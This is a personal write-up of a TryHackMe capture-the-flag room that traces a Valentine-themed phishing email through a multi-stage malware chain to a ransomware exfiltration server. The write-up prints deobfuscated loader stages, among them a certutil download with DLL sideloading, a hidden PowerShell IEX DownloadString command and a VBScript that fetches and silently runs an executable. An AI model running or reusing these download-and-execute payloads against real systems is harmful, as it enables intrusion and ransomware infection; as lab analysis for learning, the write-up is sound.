---
tags:
  - tryhackme
  - ctf
  - easy
  - defensive
  - forensics
  - binary-analysis
  - scripting
---

# Love at First Breach 2026 - Advanced Track - LOVELETTER
**Platform:** TryHackMe  
**Type:** CTF 
**Difficulty:** Hard  
**Link:** [Love at First Breach 2026 - Advanced Track](https://tryhackme.com/room/lafbctf2026-advanced) (Task 2)

## Description
"This Valentine's Day, an employee at Cupid Corp received a heartfelt e-card from a secret admirer, but romance wasn't the only thing in the air. Initial findings reveal that multiple attacker-controlled domains are tied to the campaign, each serving a distinct role in a highly sophisticated, multi-stage payload delivery chain.

The threat actor behind this operation appears to be exceptionally meticulous, with infrastructure configured to serve payloads only to genuine targets, specifically Windows users, effectively staying under the radar of automated analysis tools and casual investigation. However, it was eventually discovered that this specific campaign points all domains to MACHINE_IP.

Your mission: Trace the full attack chain, reverse-engineer the payloads, and recover the stolen data before the trail goes cold.

To get started, investigate the email in this [archive](https://lafb-files.s3.eu-north-1.amazonaws.com/loveletter.zip) to identify the infection's origin.

Zip password: happyvalentines"

## Environment and Artefacts provided
THM target machine (live)  
Suspected phishing email (.eml file)

## Phishing email (analysis)
I examined the contents of the email in two ways:  

* In its graphical format with Thunderbird.
* Reading the plaintext with `cat`.

The graphical representation shows an email from a company to inform the recipient of an alleged Valentine's Day card. The company name could be "Valentine's Day E-Cards", "Valentine's E-Card Service", or "Valentine E-Cards" - these can be seen in the header and footer. The sender address appears to be noreply@e-cards.valentine.local. It is not personalised (addressed as "Dear friend") and originates from a "Secret Admirer". There is a feeling of urgency - the card allegedly disappears after 7 days. The e-mail contains three links:  

* A link to "Open Your Valentine" (http://delivery.cupidsarrow.thm/card.html).  
* A link to contact support at the company (support@e-cards.valentine.local).
* An unsubscribe link (http://delivery.cupidsarrow.thm/unsubscribe).

The CLI text analysis of the raw email content does not appear to contain any conflicting information to what was found during graphical analysis.

## Live machine (enumeration)
Given the findings from the email analysis, I firstly added both `cupidsarrow.thm` and `delivery.cupidsarrow.thm` with the provided machine's IP address to the `/etc/host` file. Both the raw IP address and flat `cupidsarrow` domain returned the same page in an internet browser. Attempting to navigate to the `delivery` subdomain resulted in a customised `404` error - I got the same result for the URL that supposedly contained the Valentine's Message and the `unsubscribe` link from the e-mail. There was no `robots.txt` file and the source code didn't contain anything useful.

Before furthering the web enumeration, I went back to basics. I generated a list of open ports for more comprehensive enumeration with the following:  
`ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`  
This revealed the following open ports:

* 22
* 80
* 8080  

I ran a full `nmap` scan to query the services for version information, as well as querying the target system for OS information with `nmap -p$ports -A -T4 TARGET_IP_ADDRESS`, which revealed the following:  
![nmap initial scan](task_1_loveletter.exe/nmap_initial_scan.png)  

Navigating to the page at port 8080 (as found in the `nmap` scan) resulted in a `401` JSON response. The `nmap` scan told me the request is being refused because of a missing `WWW-Authenticate` header, but without knowing the expected values, I can't do much with this. There's a good article about this header in the [Mozilla Developers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/WWW-Authenticate) documentation.

I used my go-to `ffuf` command to enumerate the website at port 80:  
`ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c`

Nothing interesting there:  
![ffuf initial scan](task_1_loveletter.exe/ffuf_initial_scan.png)

I followed that up with a scan of the 8080 port. Nothing useful here either:  
![ffuf 8080 scan](task_1_loveletter.exe/ffuf_8080_scan.png)  

Knowing that there's a subdomain in play, I decided to try a DNS zone transfer with `dig` to see if there were others, but this was rejected. I moved on to enumeration with `gobuster` but the errors started piling up within the first few attempts, so I figured this was likely throttling as per the challenge description. Finally, I tried a `vhost` scan with `gobuster` as an alternative, but got no results here either (with both the 80 and 8080 ports). I did a recursive directory enumeration on the main site and found a JS endpoint at `javascript/jquery/jquery` but this appeared to be a standard jquery library (at least according tto ChatGPT - I had to ask it very forcefully to read the file properly, it was trying to be very lazy).

I ran an `nmap` UDP scan but the only open port I found was DHCP, which I suspected was open out of lab necessity rather than as an exploitable attack path.

I also ran a couple more recursive `ffuf` scans with two alternative word lists (a larger one and a smaller one with common words), but nothing there either.

I ran an `nmap` vulnerability scan, which reported that there were two possible vulnerabilities that might be exploitable, but one of them was a DOS so not of interest in a CTF. The other sounded promising - an HTTP verb tampering attack that might achieve an authentication bypass, but when I sent an OPTIONS request with `nc`, the only accepted methods were reported as `HEAD`, `GET`, and `OPTIONS`. The first and second both returned `401` errors.

I did a quick round of research for the following software versions identified in the `nmap` scans but came up empty:  

* OpenSSH 8.9p1  
* Apache httpd 2.4.52  
* Werkzeug httpd 3.1.5  
* Linux 4.15 - 5.19  

Considering the challenge specifically (and pointedly) mentions Windows hosts, I also looked at whether the decompressed email file had an alternative data stream with PowerShell (`Get-Item <fileName> -Stream *`) but no joy there. This step did however make me think - if the payload is specifically targeting Windows users, could it be that there is a user-agent check being used by the web app that would refuse or grant access to the `card.html` link contained in the original e-mail? I fired up Burp, redirected the traffic in my browser with FoxyProxy, and sent the request to Repeater. I'm using Firefox on my attack box so in theory all I needed to do is change the user-agent value so that the request appears to be coming from a Windows device. A list of valid user agents can be found [here](https://www.whatismybrowser.com/guides/the-latest-user-agent/firefox). Replacing the Linux value with a Windows value in the Repeater request returned different responses - `403` for the `delivery` subdomain, `400` for the `card.html` and `unsubscribe` endpoints. Thinking that perhaps this was an issue with the way that requests are rendered within Burp, I went back to the browser to see if I could force a change of user-agent there.

In the Web Developer tools of the browser, there is a inbuilt tool for testing how a web page will appear on particular devices - it's called Responsive Mode:  
![Responsive mode](task_1_loveletter.exe/responsive_mode.png)  

Using this mode, a menu appears at the top of the browser, allowing you to emulate browsing web pages from specific devices. By choosing any device with a Windows OS and reloading the `card.html` page, I finally got access to something that looked useful (the `delivery` and `unsubscribe` endpoints still returned a `404` error):  
![Download card](task_1_loveletter.exe/download_payload.png)  

Downloading the file delivered a file called `LOVE_LETTER.pdf.iso` to my attacker machine. Whilst I was here, I also checked the source code, which revealed a JS script on the remote machine (`valentine-animations.js`). Looking at the contents, it was clear it was heavily obfuscated, which seemed out of context for a simple animation element for a web page. I saved it off for possible further exploration.

## valentine-animations.js discovered script (analysis)
The file can be divided into three main sections:  

* A header section -  sets some variables, clearly obfuscating the word "debugger".  
* A "payload" section - clearly heavily obfuscated.  
* Genuine code required for rendering the webpage it was hosted on, containing nothing of interest.

The obfuscated "payload" actually consists of a Base64-encoded string consisting of the repeated word “VALENTINE” (`VkFMRU5USU5F`). After decoding, the script XORs the data with a repeating key (“VALENTINE” - set in the `_k` variable as ASCII characters: `[86,65,76,69,78,84,73,78,69]`), producing an array of null bytes. These bytes are packaged into a Blob and automatically downloaded. 

No additional malicious functionality is present in this script - the "payload" and obfuscated debugger reference may be present as decoys for the genuine payload somewhere else.

## LOVE_LETTER.pdf.iso downloaded file (analysis)
Running `file` on the downloaded file revealed that it was in fact a .iso compressed image:  
![ISO file](task_1_loveletter.exe/iso_file.png)  

Opening that with the inbuilt Archive Manager utility on Kali revealed a Windows shortcut file:  
![Compressed shortcut file](task_1_loveletter.exe/compressed_shortcut_file.png)  

Extracting that and running `file` again provided some useful information:  
![.lnk file](task_1_loveletter.exe/link_file.png)  

Using `exiftool` to examine the .lnk file provides some information about what the shortcut is likely to do:  
![exiftool output](task_1_loveletter.exe/exiftool_output.png)

Breaking this output down, it appears that clicking this shortcut would do the following:  

* Opens a hidden/minimised command prompt window.  
* Sets the working directory for the command prompt as C:\Users\ADMINI~1\AppData\Local\Temp\2.  
* Runs a command into the command prompt window, launching a `mshta` instance with the target `http://ecard.rosesforyou.thm/love.hta`, then exits (this is the `/C` switch).  

The purpose of the shortcut is hidden by the name of the shortcut "Valentine's Day Love Letter", with the actions being performed by the shortcut deliberately hidden with the `Show Minimized` option. The working directory is placed in an obscure directory on the local machine, which could conceivably be used as a staging area for legitimate applications. Furthermore, the command being copied into the command prompt is obfuscated by the use of excessive whitespace, string-splitting (with the `^` character), and the use of variables.

The Mshta technique for dropping malicious payloads on victim machines is well documented. I used the [Red Canary](https://redcanary.com/threat-detection-report/techniques/mshta/) report to help me understand the attack flow. In this instance I think it likely that it will be used the "paste and run" technique to download an apparent payload from the `love.hta` endpoint, a technique that would go undetected as the Mshta binary is signed and trusted by Windows (referred to as a "Living-off-the-Land Binary", or LOLBIN).

After adding the new domain to the `/etc/hosts` file, navigating to the URL contained within the .lnk file resulted in the same customised `404` error I had been seeing with the site from the beginning of the challenge. Remembering the techniques used to hide the malicious files earlier on, I wondered whether it might only be obtainable if contacted by the Mshta tool. A quick Google gave me a user-agent string I could use with the Responsive Design Mode in Firefox (`Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko`):  
![Custom UA string](task_1_loveletter.exe/custom_ua_string.png)  

After setting the custom UA string, I refreshed the page and the `love.hta` file downloaded to my attacker machine automatically.

## love.hta downloaded file (analysis)
Running `file` on this new file showed that it was, as expected, a .hta file, readable as ASCII:  
![.hta file output](task_1_loveletter.exe/hta_file_output.png)  

Reading the file with `cat` showed it was, once again, heavily obfuscated, though this time I was looking at a VBScript. Intent masquerading is continued with the use of the title "Valentine". The program would be launched in a hidden/minimised state. The obfuscation is achieved by building the payload, character by character, using ASCII character representation. After deobfuscation (this can be done in a number of ways, I used AI for speed), the content of the file is as follows:  
```
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

temp = fso.GetSpecialFolder(2).Path
workDir = temp & "\valentine"

If Not fso.FolderExists(workDir) Then
    fso.CreateFolder(workDir)
End If

url = "http://gifts.bemyvalentine.thm/bthprops.cpl"

cmd = "certutil -urlcache -split -f " & url & " " & workDir & "\bthprops.cpl"
shell.Run cmd, 0, True

systemRoot = shell.ExpandEnvironmentStrings("%SYSTEMROOT%")

fso.CopyFile systemRoot & "\System32\fsquirt.exe", workDir & "\fsquirt.exe", True

shell.Run workDir & "\fsquirt.exe", 0, False
```

The script, when executed, would do the following:  

* Creates a new shell object, for executing commands.
* Creates a new file system object, for manipulating files and folders.
* Sets the `temp` variable as the `%TEMP%` directory (this is the `GetSpecialFolder` part).  
* Sets the working directory variable to be a subdirectory of the `%TEMP%` directory, named `valentine`.
* Creates that `valentine` if it doesn't already exist.
* Sets a target url variable for a control panel file (`.cpl` file extension) from previously unseen domain (`gifts.bemyvalentine.thm`).
* Sets a command variable - the command set downloads the .cpl file from the previous step to the working directory.
* Sets a new systemRoot variable as the value of the `%SYSTEMROOT%` variable on the target system.
* Copies the `fsquirt` executable on the target machine from the `%SYSTEMROOT%` directory to the working directory of the script.
* Runs the copied `fsquirt` executable. 

Downloading the .cpl file with `certutil` ensures the resulting download is trusted by Windows (LOLBIN technique again). Furthermore, using the `fsquirt` executable, a native Windows binary, as part of the attack chain once again ensures that Windows trusts its execution. In order to put these pieces of the puzzle together, I needed to find out what that .cpl file was. As with the previous file downloads (and after adding the new subdomain to the `/etc/hosts` file), navigating to the page in the VBScript returned the same customised `404` file. Knowing that the web application is expecting the file to be downloaded with `certutil`, I turned to Google again to see if there was a new user-agent string I could use. I found one pretty quickly: `CertUtil URL Agent`. I used Developer Tools again to update the custom user-agent string, refreshed the page, and once again the file downloaded as expected.

## bthprops.cpl downloaded file (analysis)
Running `file` on the .cpl file suggested it was actually a DLL file:  
![.cpl file out](task_1_loveletter.exe/cpl_file_output.png)  

With this information, it became evident that the previous VBScript was executing a DLL sideloading attack - having a legitimate Windows binary load an attacker DLL file.

Windows executable files can be examined in detail using Ghidra, so I went ahead and created a new proect, importing the DLL into the CodeBrowser. After Ghidra did its magic (analysis and decompilation), I went about looking for the `main` function. Because this is a DLL file, I was specifically looking for a `DllMain` function. Lucky for me, there's one here:  
![DllMain function](task_1_loveletter.exe/dllmain_function.png)  

Unlucky for me, it simply contains a reference to a function elsewhere, `_p`:  
![Decompiled DllMain function](task_1_loveletter.exe/decompiled_dllmain_function.png)  

Loading up the `_p` is a bit more fruitful, but it's pretty obvious it relies heavily on another function, `_d`:  
![_p function](task_1_loveletter.exe/p_function.png)  

Finally, we get to some content that might be usable in the `_d` function:  
![_d function](task_1_loveletter.exe/d_function.png)  

So not being great at reverse engineering, at this point I turned to AI to help me understand what was going on. If I understand the explanation correctly, that `_d` function is effectively a decode function, using a transforming XOR key. The key can be seen in the function as `)` but is in fact the ASCII representation of the number "41". The decode is applied to individual characters (it's actually per byte, but for the purposes of this function, that's characters), taking their index position and multiplying it by 41. It takes that multiplied value and uses it to XOR the original value. Finally it takes that resulting value and XORs it by 0x4c. The middle section of this function is what makes this a transforming key - each character has its own primary XOR key dependant on its position in the full string that is being decoded.

That all sounds pretty complicated to me! The good thing is that XOR operations are entirely reversible. What's more, if I go back to the `_p` function, we can see the memory locations that provide the characters to be decoded, which means we can decode the string ingrained into the program. I asked AI to generate a script that would do this for me, and this is what it came up with (which does work!):  
```
def decode_hex_string(hex_input):
    # remove spaces and convert to bytes
    hex_input = hex_input.replace(" ", "").strip()
    data = bytes.fromhex(hex_input)

    decoded = bytearray()

    for i, b in enumerate(data):
        decoded_byte = b ^ ((i * 41) & 0xFF) ^ 0x4C
        decoded.append(decoded_byte)

    return decoded


if __name__ == "__main__":
    s = input("Enter hex string: ")
    result = decode_hex_string(s)

    print("\nDecoded bytes:", result)
    try:
        print("Decoded text :", result.decode("utf-8"))
    except:
        print("Decoded text (latin1):", result.decode("latin1"))
```

So now all I have to do is get the hex values out of their memory locations, which can be done using the Bytes window and a special copy function (Copy "Byte String"). Using that script I was able to extract the following command from the program:  
`powershell -w hidden -ep bypass -nop -c powershell IEX New-Object Net.WebClient DownloadString http://loader.sweethearts.thm/cupid.ps1`  

So in essence, this opens PowerShell in a hidden window, sets the execution policy to bypass (this allows unsigned scripts to be run in the current scope). It goes on to invoke a PowerShell command in that window to create a new web client object to download a script at the given location.

Given this script was intended to be downloaded by a command line tool, I used `curl` to download it (after adding that new domain to the `/etc/hosts` file of course).

## cupid.ps1 downloaded file (analysis)
As with the other files, I ran `file` to see what it was. Looks like a readable ASCII file:  
![cupid.ps1 file output](task_1_loveletter.exe/cupid_file_output.png)  

Surprise, surprise, it was obfuscated, partly through string splitting, partly through hex-encoding at the character level. Given the mix of techniques being applied, I once again turned to AI to perform the deobfuscation task for me. The resulting script performed the following sequence of functions:  

* Check for common running debuggers, like Process Monitor and Wireshark. If one is found, a flag is set (this flag is actually not referred to for the rest of the script - usually this would be used to terminate the process to avoid detection).
* Starts a short sleep timer of 2 seconds - this is usually used to evade sandbox environments.
* Constructs a URL to download another payload from - `http://cdn.loveletters.thm/roses.jpg`.
* Sets a payload marker variable of `<!--VALENTINE_PAYLOAD_START-->`.
* Looks inside the extracted byte values from the downloaded file for the payload marker.
* XOR decrypts the bytes following the payload marker with the key "ROSES".  
* Base64 decodes the resulting XOR'd value.
* Saves the resulting data to `$temp\valentine.vbs`.  
* Silently executes the downloaded paylad with `cscript`.

Given this script was intended to be downloaded by a command line tool, I used `curl` to download it (after adding that new domain to the `/etc/hosts` file of course).

## roses.jpg downloaded file (analysis)
As with the other files, I ran `file` to see what it was. Looks like an image file like it claims:  
![roses.jpg file output](task_1_loveletter.exe/roses_file_output.png)  

If the PowerShell script is to be believed, it should be possible to extract the payload from this downloaded file using the script's functionality as a guide. As with the previous tasks in this challenge, I asked AI to generate a script for me, and this is what I got back (functioning):  
```
import base64

MARKER = b"<!--VALENTINE_PAYLOAD_START-->"
XOR_KEY = b"ROSES"

INPUT_FILE = "roses.jpg"
OUTPUT_FILE = "valentine_decoded.vbs"


def xor_decrypt(data, key):
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key[i % len(key)])
    return bytes(out)


def main():
    print("[*] Reading file...")
    with open(INPUT_FILE, "rb") as f:
        content = f.read()

    print("[*] Searching for payload marker...")
    pos = content.find(MARKER)

    if pos == -1:
        print("[!] Marker not found")
        return

    print(f"[+] Marker found at offset {pos}")

    # extract everything after marker
    payload = content[pos + len(MARKER):]

    # strip trailing junk (common in these CTF files)
    payload = payload.strip()

    print("[*] XOR decrypting...")
    decrypted = xor_decrypt(payload, XOR_KEY)

    print("[*] Base64 decoding...")
    try:
        final = base64.b64decode(decrypted)
    except Exception as e:
        print("[!] Base64 decode failed:", e)
        return

    print("[*] Writing decoded VBScript...")
    with open(OUTPUT_FILE, "wb") as f:
        f.write(final)

    print(f"[+] Done! Output saved to: {OUTPUT_FILE}")


if __name__ == "__main__":
    main()
```

I ended up with another .vbs script saved on my attacker machine, ready for further analysis.

## valentine.vbs extracted file (analysis)
As with the other files, I ran `file` to see what it was. Looks like a readable ASCII file:  
![valentine.vbs file output](task_1_loveletter.exe/valentine_file_output.png)  

Aaaaaaand obfuscated. I know I shouldn't be surprised, but for for a single challenge in a larger CTF, this is getting a little tedious. Back to AI I went for deobfuscation magic, and this is the result:  
```
Dim fso, ws, dp, xh, sa

Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

dp = fso.GetSpecialFolder(2).Path & "\heartbeat.exe"

Set xh = CreateObject("MSXML2.XMLHTTP")
xh.Open "GET", "http://cdn.loveletters.thm/heartbeat.exe", False
xh.Send

If xh.Status = 200 Then
    Set sa = CreateObject("ADODB.Stream")
    sa.Type = 1
    sa.Open
    sa.Write xh.responseBody
    sa.SaveToFile dp, 2
    sa.Close
    Set sa = Nothing
End If

Set xh = Nothing

ws.Run "cmd /c start "" """ & dp & """", 0, False
```

So put simply, this script creates a shell object to download an executable folder called `heartbeat.exe` from another new domain (yes, this was added to my `/etc/hosts` file), saves it to the local `%TEMP%` folder as the raw binary output, then executes it silently. As with the other files, I used `curl` to get hold of the file.

## heartbeat.exe downloaded file (analysis)
As with the other files, I ran `file` to see what it was. Looks like a Windows executable file, just like it claims to be:  
![heartbeat.exe file output](task_1_loveletter.exe/heartbeat_file_output.png)

I used Ghidra again to examine the contents of this new executable file. The `main` function is pretty simple - it displays a message to the screen, calls on another function to build an authorization header, calls a function to exfiltrate files from the file system, and finally calls another function to display a ransom note. With that in mind, I started to look at the component functions, which actually had very helpful names.

`build_auth_header`  
After printing three lines of text to the screen, this is the first function to be called. Firstly it builds a string object - at first glance this appears to consist of a colon and the string `cupid_agent`. The string agent is then base64 encoded and added to a further string to construct the authorization header. Importantly, this further string tells us that the service it is intended for is using basic authentication. A second header (`Content-Type: application/octet-stream`) is included in this function, indicating that this function is intended for use with a stream of data. Knowing that the first of these two headers is for use with a basic authentication scheme suggests that `cupid_agent` is likely to be a user, but the header would usually include a password as well. Looking at the Listing pane in Ghidra reveals a static string being stored in a pointer on the stack prior to the construction of the string object:  
![Hidden password](task_1_loveletter.exe/hidden_password.png)  

Having found this, we can summise that the header being constructed by this `build_auth_header` function are:  
```
Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==
Content-Type: application/octet-stream
```

`exfiltrate_files`  
The second of the component functions from `main` performs the main encryption process for a successful ransomware attack:  

* Enumerate the files in the working directory.
* Skip directories (so only files are included), already-encrypted files, and executables.
* For each file it finds, opens the file, reads it into memory, and sends it to the attacker server where it is encrypted.
* Per file, receives the encrypted equivalent back from the server and saves it to the local file system.

The important part for this challenge is in the section that sends the files to the attacker server. Looking at this part of the function, we can see that the constructed header from the previous function is used in the request to the server. Furthermore, it identifies the address that the files are being sent to:  
![Exfil address](task_1_loveletter.exe/exfil_address.png)  

Given that `0x1f90` is the hex representation of `8080`, we can infer that this means files are being sent to `http://api.valentinesforever.thm:8080/exfil`, complete with an authorization header, finally bringing us back to the original `nmap` and web enumeration findings.

`display_ransom_note`  
The final of the three functions that make up the `main` function is a simple note to display demanding some BitCoin. There's a wallet address here - this isn't much use to us right now (spoiler alert: it's not relevant).

After adding the newly discovered domain to my `/etc/hosts` file, I sent a request to it on the 8080 port found in the executable, capturing it through Burp. Sending this request to Burp and adding the authorization header that I discovered in the `build_auth_header` function resulted in a response other than a `404`:  
![Auth header success](task_1_loveletter.exe/auth_header_success.png)  

Awesome, that proves the credentials are valid! It also suggests that somewhere in the pipeline, the files are being encrypted with RC4 - a stream cipher. Sadly, that response is the same when you send a request to the `/exfil` endpoint, so that leaves us with the question of what we're supposed to do with it. Looking back at the functions from the executable, I could see that there are calls to `printf`, suggesting this process could be running through some sort of command-line interface. With that in mind, I constructed a `curl` request to the endpoint and got a different response:  
![curl response](task_1_loveletter.exe/curl_response.png)  

We can now adapt our `curl` requests to download each of the files from the server to our local machine for inspection, using the following command:  
`curl http://api.valentinesforever.thm:8080/exfil/<fileName> -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' -o <fileName>`

## Exfiltrated files downloaded files (analysis)
Running `file` on each of the files downloaded suggests them to be data files:  
![Exfil file types](task_1_loveletter.exe/exfil_file_types.png)  

Reading the headers for the files however reveals them to be encrypted at this point already:  
![Exfil file contents](task_1_loveletter.exe/exfil_file_contents.png)  

Thinking back to the response I got from the `api` endpoint, and more specifically about the RC4 stream cipher in use, it may be possible to recover the encrypted data on the server if the keystream in use to perform the encryption is static. This is because stream ciphers encrypt data by XOR'ing cleartext data with a keystream to produce ciphertext. All of that means that if we have a a file whose contents are known as well as the resulting ciphertext, the keystream should be able to be calculated. The keystream can then be used to decrypt other ciphertext from the same encrypting instance. Better still, if we can produce a file of null bytes, the file we have returned from the server will be the keystream exactly (due to the XOR operation - the opposite of the null byte will be the keystream character at the corresponding index position). With that in mind, the first thing to do is create a null byte file, preferably in a size larger than any of those observed on the server - this ensures the keystream is captured in full. We can do this with `dd`:  
`dd if=/dev/zero of=zeros.bin bs=1 count=8192`  

I then uploaded the file to the `exfil` endpoint, changing the `curl` request to include the `Content-Type` header found in the executable earlier and using a `POST` request:  
`curl http://api.valentinesforever.thm:8080/exfil -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' -H 'Content-Type: application/octet-stream' --data-binary @zeros.bin -o keystream.bin`  

To test the theory, I re-examined the file listing on the `exfil` endpoint and downloaded the new file amongst the list. As with the other scripting elements of this challenge, I generated a helper script that would perform the needed mathematical operations on the data(functioning):  
```
def xor_decrypt(cipher_path, keystream_path, output_path):
    with open(cipher_path, "rb") as f:
        cipher = f.read()

    with open(keystream_path, "rb") as f:
        keystream = f.read()

    # repeat keystream if victim file longer
    ks = (keystream * ((len(cipher) // len(keystream)) + 1))[:len(cipher)]

    plain = bytes(c ^ k for c, k in zip(cipher, ks))

    with open(output_path, "wb") as f:
        f.write(plain)

    print("Done:", output_path)


xor_decrypt("victim.enc", "keystream.bin", "victim.dec")
```

Reading the contents of the newly decrpted file with `xxd` reveal a delightful loaf of null bytes, just like the original plaintext did. Now to see if the keystream is static! I tested it with the first file in the list, and the resulting file was a long stream of `A`s. Hmmm, maybe good, maybe bad. I went ahead and ran the rest of the files through the script before running `file` on the outputs:  

![Decrypted file types](task_1_loveletter.exe/decrypted_file_types.png)  

Alright, nice. I decided to take a look at those files that aren't just very long lines of text, starting with the first in the list and hit gold with the required flag:  
![Flag success](task_1_loveletter.exe/flag_success.png)  
??? success "What is the value of the flag?"
	THM{l0v3_l3tt3r_fr0m_th3_90s_xoxo}

## Personal note
I really enjoyed this challenge, despite the fact I didn't finish it within the time limit. I learned so much - new tricks with Developer Tools, got more confident with Ghidra, had an opportunity to examine Python scripts, consolidate my understanding of encryption a little - all while getting to see a very real-world example of a phishing > full ransomware compromise end-to-end. The only thing I will say is that as a single task within a larger CTF, this feels like a long slog, but that doesn't take away any of the learning I got from it. I will definitely be looking for more of these sorts of rooms to work through in the future!

**Tools Used**  
`Browser Developer Tools` `exiftool` `Ghidra` `python` `curl`

**Date completed:** 24/04/26  
**Date published:** 24/04/26